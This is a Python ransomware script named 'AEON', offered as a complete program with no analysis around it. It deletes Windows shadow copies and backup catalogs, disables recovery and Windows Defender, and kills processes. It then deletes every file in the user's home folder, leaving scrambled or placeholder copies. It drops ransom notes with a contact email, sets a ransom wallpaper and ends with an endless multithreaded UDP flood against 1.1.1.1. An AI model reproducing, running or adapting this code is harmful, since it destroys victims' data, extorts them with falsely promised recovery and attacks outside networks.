from cryptography.fernet import Fernet
import binascii
import base64
import random,os,time,platform
import psutil
import requests
import os
import socket
from os import urandom as randbytes
import threading

files_encrypted = f".{random.choice(('EWLR','AEON','chloecampbell456@proton.me'))}"

def kill_process_by_name(process_name):
    all_processes = psutil.process_iter()
    for process in all_processes:
        try:
            if process.name() == process_name:
                process.terminate()
                print(f"Process '{process_name}' terminated.")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

if platform.system().upper() == 'WINDOWS':
    process_name_to_kill = ["chrome.exe","taskmanger.exe",'KillSwitch.exe']
    kill_process_by_name(process_name_to_kill)
    os.system('VsSaDmIn delete shadow /all /quiet')
    os.system('WmIc shadowcopy delete')
    os.system('BcDeDiT /set {default} bootstatuspolicy ignoreallfailures')
    os.system('BcDeDIt /set {default} recoveryenabled no')
    os.system('WbAdMiN delete catalog -quiet')
    os.system('Sc stop WinDefend')
    os.system('TaSkKiLl RaccineSettings.exe')

path = os.path.expanduser('~')

def scan(path):
    allFiles = []
    for home, sub_files, file_list_s in os.walk(path):
        for name_files in file_list_s:
            if files_encrypted in name_files:
                continue
            allFiles.append(os.path.join(home, name_files))
    return allFiles
DATA_KEYS = []
def ENCRYPTION_EWLR(data,fileos): # Encryption Way List Random
    global DATA_KEYS
    try:
        a = data.encode()
    except AttributeError:
        a = data

    b = b''
    count = 0
    fernet_count = 0
    base64_count = 0
    binascii_count = 0
    encryptor_way = ['BASE64', 'FERNET', 'BINASCII']

    PROOF_ATK = ''
    while count < 4:
        count += 1
        encryptor_get = random.choice(encryptor_way)
        if encryptor_get == 'FERNET':
            fernet_count += 1
            key = Fernet.generate_key()
            PROOF_ATK += f'FERNET|{fernet_count}|{key}\n'
            encryption = Fernet(key)
            if count == 1:
                b = encryption.encrypt(a)
            else:
                b = encryption.encrypt(b)
        elif encryptor_get == 'BINASCII':
            binascii_count += 1
            PROOF_ATK += f'BINASCII|{binascii_count}\n'
            if count == 1:
                b = binascii.hexlify(a)
                b = binascii.a2b_hex(b)
                b = base64.b64encode(b)
            else:
                b = binascii.hexlify(b)
                b = binascii.a2b_hex(b)
                b = base64.b64encode(b)
        else:
            base64_count += 1
            PROOF_ATK += f'BASE64|{base64_count}\n'
            if count == 1:
                b = base64.b16encode(a)
                b = base64.b32encode(b)
                b = base64.b64encode(b)
            else:
                b = base64.b16encode(b)
                b = base64.b32encode(b)
                b = base64.b64encode(b)

        if fernet_count == 2 or binascii_count == 2 or base64_count == 2:
            encryptor_way.remove(encryptor_get)
    PROOF_ATK += f'ENCRYPTION|{fileos}\n'
    DATA_KEYS.append(PROOF_ATK)
    return b
count = 0
openFiles= scan(path)
for file_os in openFiles:
     try:
         files = open(file_os, "rb")
     except:
         try:
             files = open(file_os, "r")
         except:
             pass
     finally:
      try:
          Data_Text = files.read()
          files.close()

          os.remove(file_os)
          if len(Data_Text) > 5:
           encodedStr = str('YOU DATA HAVE BEEN CLEAR')
          else:
           encodedBytes = ENCRYPTION_EWLR(Data_Text,file_os)
           encodedStr = str(encodedBytes,"utf-8")

          output = os.path.join(os.path.dirname(file_os), os.path.basename(file_os) + files_encrypted)
          files2 = open(output, "w")
          files2.write(encodedStr)
          count += 1
      except:
          pass
      
for dirName, subdirList, fileList in os.walk(path):
    Output_files2 = os.path.join(os.path.join(dirName),'HTML_NOTE@AEON.hTML')
    file2 = open(Output_files2,'w')
    file2.write('''<title>AEON - RANSOMWARE </title>
<HTA:APPLICATION
      ICON="msiexec.exe"
      SysMenu="no">
<body bgcolor="black">
<center>
<img src='data:image/png;base64,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'>
<h1 style="font-family:Microsoft YaHei;font-size:150%;color:white">All your files have been encrypted!</h1>
<h1 style="font-family:Microsoft YaHei;font-size:100%;color:white">with strongest ancryption algorithm and unique key, orignal files has been over written.<br>Dont waste your time no recovery tools and softwares will help
    to recover them without our decryption service.<br>Private key is stored on a server.</h1>
<h1 style="font-family:Microsoft YaHei;font-size:100%;color:white">We guarrantee that you can recover all your files safely<br>All you
    need to do is submit a payment and get the decrption password</h1>
<h1 style="font-family:Microsoft YaHei;font-size:100%;color:white">Contact: chloecampbell456@proton.me</h1>''')
    file2.close()
    OutputFile = os.path.join(os.path.join(dirName),f"_r_e_a_d_m_e_@Aeon.txt")
    try:
        r = requests.get('http://1.1.1.1')
        if r.status_code == 200:
         s = 'CONNECTION 200 OK'
    except:
        s = 'FAILED'
    file = open(OutputFile,'w')
    file.write(f'''Oops!! Your files have been encrypted.

All your  files are no longer accessible and has been encrypted
with strongest ancryption algorithm and unique key, orignal files has been over written. Dont waste your time no recovery tools and softwares will help
to recover them without our decryption service. Private key is stored on a server.

We guarrantee that you can recover all your files safely. All you
need to do is submit a payment and get the decrption password

Contact: chloecampbell456@proton.me

LOGS --->
''')
    file.close()

if platform.system().upper() == 'WINDOWS':
 from PIL import Image, ImageDraw, ImageFont
 import ctypes

 char_setting = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
 char_file = ''
 for bit_files in range(15):
    char_file += random.choice(char_setting)

 IMG_wallpaper = char_file + '.png'
 Img = Image.new("RGB", (2050, 1050))
 Canvas= ImageDraw.Draw(Img)
 font = ImageFont.truetype("arial", int(55))
 Canvas.text((10,10),(f"""\n\n\n
                ALL YOUR PERSONAL FILES HAVE BEEN ENCRYPTED!\n
                IF YOU WANT RESTORE YOUR DATA YOU HAVE TO PAY!\n
            CONTACT US: chloecampbell456@proton.me\n
            ID {char_file}\n
            FILES={count}"""),fill=(255,0,0),font=font)                                                  
 Img.save(IMG_wallpaper)
 ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{os.getcwd()}\\{IMG_wallpaper}' , 0)
 time.sleep(0.3)
 os.remove(IMG_wallpaper)

def attack_wifi2(ip,port,number_of_attack,size):
    dos1 = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    try:
        byt_gen = randbytes(int(size)) + random._urandom(int(size)) # Reply from 192.168.1.1: Destination net unreachable.
        ran = random.randrange(10**80)
        hex = "%064x" % ran
        hex = hex[:64] 
        byt = byt_gen.fromhex(hex) + byt_gen
        for _ in range(int(number_of_attack)):
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
    except:
        pass

def attack_wifi(ip, port,number_of_attack,size):

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(int(size))
    bytes2 = randbytes(int(size))

    send = base64.urlsafe_b64encode(bytes + bytes2)

    send2 = base64.b64encode(bytes + bytes2)

    send3 = base64.standard_b64encode(bytes + bytes2)

    send4 = base64.b16encode(bytes+bytes2)

    send5 = base64.b32encode(bytes+bytes2)

    send6 = base64.b32hexencode(bytes+bytes2)

    send7 = base64.b85encode(bytes+bytes2)

    for _ in range(int(number_of_attack)):
        try:
            s.sendto(b"\000" + send + send2 + send3 + send4 + send5 + send6 + send7 + bytes + bytes2,(ip, port))
        except:
            pass

def sending_flood(ip,port,time,size,keep_attack):
    for _ in range(250):
        threading.Thread(target=attack_wifi,args=(ip,port,time,size)).start()
        threading.Thread(target=attack_wifi,args=(ip,port,time,size)).start()
        threading.Thread(target=attack_wifi,args=(ip,port,time,size)).start()
        threading.Thread(target=attack_wifi,args=(ip,port,time,size)).start()
        threading.Thread(target=attack_wifi,args=(ip,port,time,size)).start()
        threading.Thread(target=attack_wifi2,args=(ip,port,time,size)).start()
        threading.Thread(target=attack_wifi2,args=(ip,port,time,size)).start()
        threading.Thread(target=attack_wifi2,args=(ip,port,time,size)).start()
        threading.Thread(target=attack_wifi2,args=(ip,port,time,size)).start()
        threading.Thread(target=attack_wifi2,args=(ip,port,time,size)).start()
    if keep_attack.upper() == 'Y' or keep_attack.upper() == 'YES':
        sending_flood(ip,port,time,size,keep_attack)
ip = str('1.1.1.1')
port = int(80)
time_without_time = int(99999999999)
size_boom = int(15)
keep_attack = str('Y')
sending_flood(ip,port,time_without_time,size_boom,keep_attack)
